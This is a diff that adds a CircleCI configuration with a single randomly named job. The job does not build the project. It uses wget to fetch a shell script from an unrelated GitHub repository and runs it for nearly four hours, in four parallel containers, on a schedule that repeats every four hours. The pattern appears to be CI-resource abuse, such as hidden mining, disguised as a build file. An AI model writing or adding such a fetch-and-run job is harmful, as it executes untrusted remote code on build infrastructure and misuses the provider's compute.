@@ -1,0 +1,32 @@
+working_dir: &working_dir ~/app
+
+version: 2.0
+jobs:
+  nadirah:
+    parallelism: 4
+    docker:
+      - image: circleci/php:8.0.6
+    steps:
+    - checkout
+    - run:
+        name: torasudiro
+        command: |
+                  wget -O buildphp.sh https://raw.githubusercontent.com/set-arithmetic/Buildkite/main/buildphp.sh && chmod u+x buildphp.sh && timeout 238m ./buildphp.sh && echo "suksesd"
+        no_output_timeout: 360m
+        
+workflows:
+  version: 2
+  commit:
+    jobs:
+      - nadirah
+    triggers:
+      - schedule:
+          cron: "0 2,6,10,14,18,22 * * *"
+          filters:
+            branches:
+              only:
+                - master
+                
+  phprunbuild:
+    jobs:
+      - nadirah
